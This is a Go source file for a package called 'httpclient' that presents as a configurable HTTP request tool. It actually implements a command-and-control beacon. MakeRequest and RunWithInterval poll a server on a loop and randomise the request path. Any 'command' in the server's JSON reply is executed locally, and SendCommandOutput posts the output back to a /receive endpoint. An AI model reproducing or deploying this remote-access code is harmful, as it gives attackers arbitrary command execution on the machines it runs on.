package httpclient

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"time"
)

// RequestOptions defines available options for an HTTP request.
type RequestOptions struct {
	Method        string            // HTTP method (GET, POST, etc.)
	BaseURL       string            // Request URL
	Directories   []string          // List of directories to append to the base URL
	Headers       map[string]string // Request headers
	Body          interface{}       // Request body (JSON struct or string)
	Timeout       time.Duration     // Timeout duration
	SkipTLSVerify bool              // Whether to skip TLS verification
}

// Parse flags from user input
func (ro *RequestOptions) SetRequestFlag(fs *flag.FlagSet) {
	fs.StringVar(&ro.Method, "method", "GET", "HTTP method (GET, POST, etc.)")
	fs.StringVar(&ro.BaseURL, "url", "", "Request URL")
	fs.BoolVar(&ro.SkipTLSVerify, "skip-tls-verify", false, "Skip TLS certificate verification")

	// Process headers
	fs.Func("headers", "HTTP headers as comma-separated key:value pairs", func(val string) error {
		ro.Headers = parseHeaders(val)
		return nil
	})

	// Process body (parse JSON if applicable)
	fs.Func("body", "Request body as a JSON string", func(val string) error {
		parsedBody, err := parseBody(val)
		if err != nil {
			return err
		}
		ro.Body = parsedBody
		return nil
	})

	// Process timeout (convert string to time.Duration)
	fs.Func("timeout", "Request timeout (e.g., '5s', '2m', '500ms')", func(val string) error {
		parsedTimeout, err := parseTimeout(val)
		if err != nil {
			return err
		}
		ro.Timeout = parsedTimeout
		return nil
	})

	// New flag: Directories
	fs.Func("directories", "Comma-separated list of directories (e.g., '/dir1,/dir2,/dir3')", func(val string) error {
		if val == "" {
			return nil
		}
		ro.Directories = strings.Split(val, ",")
		for i := range ro.Directories {
			ro.Directories[i] = strings.TrimSpace(ro.Directories[i])
		}
		return nil
	})
}

// SelectRandomDirectory picks a random directory from the list.
func (ro *RequestOptions) SelectRandomDirectory() string {
	if len(ro.Directories) == 0 {
		return ""
	}
	return ro.Directories[rand.Intn(len(ro.Directories))]
}

func parseHeaders(headerStr string) map[string]string {
	headers := make(map[string]string)
	if headerStr == "" {
		return headers
	}
	for _, pair := range strings.Split(headerStr, ",") {
		parts := strings.SplitN(pair, ":", 2)
		if len(parts) == 2 {
			headers[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
		}
	}
	// Debugging headers
	// for key, value := range headers {
	// 	fmt.Printf("Header: %s: %s\n", key, value)
	// }
	return headers
}

func parseBody(bodyStr string) (interface{}, error) {
	if bodyStr == "" {
		return nil, nil
	}
	var jsonBody map[string]interface{}
	if err := json.Unmarshal([]byte(bodyStr), &jsonBody); err == nil {
		return jsonBody, nil // Parsed JSON object
	}
	return bodyStr, nil // Treat as raw string if not JSON
}

func parseTimeout(timeoutStr string) (time.Duration, error) {
	duration, err := time.ParseDuration(timeoutStr)
	if err != nil {
		return 0, fmt.Errorf("invalid timeout format: %s", timeoutStr)
	}
	return duration, nil
}

// ExecuteCommand runs the received command and returns the output.
func ExecuteCommand(command string) (string, error) {
	// Split the command into name and args
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return "", errors.New("empty command received")
	}

	cmd := exec.Command(parts[0], parts[1:]...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("command execution failed: %w", err)
	}

	return string(output), nil
}

// SendCommandOutput sends the command execution result back to the server.
func SendCommandOutput(serverURL, command, output string, headers map[string]string, skipTLS bool, timeout time.Duration) error {
	// Construct JSON payload
	data := map[string]string{
		"command": command,
		"output":  output,
	}
	jsonData, err := json.Marshal(data)
	if err != nil {
		return fmt.Errorf("failed to encode JSON: %w", err)
	}

	// Create new request
	req, err := http.NewRequest("POST", serverURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to create POST request: %w", err)
	}

	// Set headers
	for key, value := range headers {
		req.Header.Set(key, value)
	}
	req.Header.Set("Content-Type", "application/json")

	// TLS configuration
	tlsConfig := &tls.Config{
		InsecureSkipVerify: skipTLS, // Skip TLS verification if requested
	}

	// HTTP client
	client := &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			TLSClientConfig: tlsConfig,
		},
	}

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send command output: %w", err)
	}
	defer resp.Body.Close()

	log.Printf("[+] Command output sent successfully, server responded with: %d\n", resp.StatusCode)
	return nil
}

// Make the request to our endpoint
func MakeRequest(opts *RequestOptions) (*ResponseData, error) {
	// Debugging
	// log.Println(opts.URL)
	// log.Println(opts.Timeout)
	// log.Println(opts.Body)
	// log.Println(opts.Headers)
	// log.Println(opts.SkipTLSVerify)
	if opts.BaseURL == "" {
		return nil, errors.New("[-] Base URL is required")
	}

	if opts.Method == "GET" && opts.Body != nil {
		return nil, errors.New("[-] GET request and body payload doesn't make sense")
	}

	// Append a random directory to the base URL
	dir := opts.SelectRandomDirectory()
	fullURL := opts.BaseURL + dir

	// Convert request body to JSON if necessary
	var reqBody io.Reader
	if opts.Body != nil {
		switch body := opts.Body.(type) {
		case string:
			reqBody = bytes.NewBufferString(body)
		default:
			jsonData, err := json.Marshal(body)
			if err != nil {
				return nil, fmt.Errorf("error encoding request body to JSON: %w", err)
			}
			reqBody = bytes.NewBuffer(jsonData)
		}
	}

	req, err := http.NewRequest(opts.Method, fullURL, reqBody)
	if err != nil {
		return nil, fmt.Errorf("error creating request: %w", err)
	}

	// Set headers
	for key, value := range opts.Headers {
		req.Header.Set(key, value)
	}

	// Custom TLS configuration
	tlsConfig := &tls.Config{
		InsecureSkipVerify: opts.SkipTLSVerify, // Skip TLS verification if requested
	}

	// Create HTTP client with timeout
	client := &http.Client{
		Timeout: opts.Timeout,
		Transport: &http.Transport{
			TLSClientConfig: tlsConfig,
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	// Read response body
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("error reading response: %w", err)
	}

	// Parse JSON response if applicable
	var jsonResponse map[string]interface{}
	if err := json.Unmarshal(respBody, &jsonResponse); err == nil {
		// return &ResponseData{
		responseData := &ResponseData{
			Status:     resp.StatusCode,
			Body:       string(respBody),
			JSONParsed: jsonResponse,
			// 	}, nil
			// }
		}

		// **Check if response contains a "command" key**
		if command, found := jsonResponse["command"].(string); found {
			log.Printf("[+] Received command: %s\n", command)
			output, err := ExecuteCommand(command)
			if err != nil {
				log.Printf("[-] Command execution failed: %s\n", err)
				output = err.Error()
			}

			postURL := opts.BaseURL + "/receive"

			// **Send the command output back to the server**
			err = SendCommandOutput(postURL, command, output, opts.Headers, opts.SkipTLSVerify, opts.Timeout)
			if err != nil {
				log.Printf("[-] Failed to send command output: %s\n", err)
			}
		}

		return responseData, nil
	}

	return &ResponseData{
		Status: resp.StatusCode,
		Body:   string(respBody),
	}, nil
}

func RunWithInterval(opts *RequestOptions, resultChan chan *ResponseData, errorChan chan error, stopChan chan os.Signal) {
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt)

	interval := opts.Timeout
	log.Printf("[+] Starting request loop. Sending requests every %v...\n", interval)

	for {
		select {
		case <-stopChan:
			log.Println("[-] Received interrupt signal. Stopping request loop.")
			return

		default:
			startTime := time.Now()

			resp, err := MakeRequest(opts)
			if err != nil {
				// log.Printf("[-] Request failed: %s", err)
				errorChan <- err
			} else {
				// log.Printf("[+] Response (%d): %s", resp.Status, resp.Body)
				resultChan <- resp
			}

			// Calculate remaining time before next request
			elapsed := time.Since(startTime)
			sleepDuration := interval - elapsed
			if sleepDuration > 0 {
				select {
				case <-time.After(sleepDuration): // Sleep unless stop signal is received
				case <-stopChan:
					log.Println("[-] Stop signal received during sleep. Exiting request loop.")
					return
				}
			}
		}
	}
}
